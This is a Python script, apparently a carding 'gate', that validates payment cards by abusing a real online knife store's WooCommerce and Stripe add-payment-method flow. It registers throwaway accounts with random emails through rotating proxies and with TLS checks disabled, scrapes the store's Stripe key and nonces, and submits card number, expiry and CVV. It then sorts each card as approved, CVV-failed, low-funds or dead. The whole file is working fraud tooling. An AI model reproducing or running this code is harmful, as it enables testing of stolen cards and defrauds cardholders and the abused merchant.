from utilsdf.functions import random_email, capture, random_proxy
from httpx import AsyncClient


async def stripe_gate(cc, month, year, cvv) -> str:
    mail = random_email()
    proxy = random_proxy()

    async with AsyncClient(
        follow_redirects=True, verify=False, proxies=proxy
    ) as session:
        r = await session.get(
            "https://www.steelportknife.com/my-account/add-payment-method/"
        )
        t = r.text
        rnonce = capture(t, '"woocommerce-register-nonce" value="', '"')

        p2 = {
            "email": mail,
            "password": "Sachio900*",
            "woocommerce-register-nonce": rnonce,
            "_wp_http_referer": "/my-account/add-payment-method/",
            "register": "Register",
        }

        r2 = await session.post(
            "https://www.steelportknife.com/my-account/add-payment-method/",
            data=p2,
        )

        r3 = await session.get(
            "https://www.steelportknife.com/my-account/payment-methods/",
        )
        t3 = r3.text
        pk = capture(t3, '"Credit Card","key":"', '"')
        ad = capture(t3, '"add_card_nonce":"', '"')

        p4 = {
            "type": "card",
            "billing_details[name]": "+",
            "billing_details[email]": mail,
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "guid": "N/A",
            "muid": "N/A",
            "sid": "N/A",
            "payment_user_agent": "stripe.js/09e54426b4; stripe-js-v3/09e54426b4; card-element",
            "time_on_page": "18016",
            "key": pk,
        }

        r4 = await session.post("https://api.stripe.com/v1/payment_methods", data=p4)
        t4 = r4.text
        pm = capture(t4, '"id": "', '"')

        p5 = {
            "stripe_source_id": pm,
            "nonce": ad,
        }

        r5 = await session.post(
            "https://www.steelportknife.com/?wc-ajax=wc_stripe_create_setup_intent",
            data=p5,
        )
        t5 = r5.text
        msg = capture(t5, '"message":"', '"')
        st = capture(t5, '"status":"', '"')

        if st == "success":
            status = "Approved! ✅"
            msg = "Success -» $0"
        elif "security code is incorrect" in msg:
            status = "Approved! ✅ -» ccn"
        elif "funds" in msg:
            status = "Approved! ✅ -» low funds"
        else:
            status = "Dead! ❌"

        return status, msg
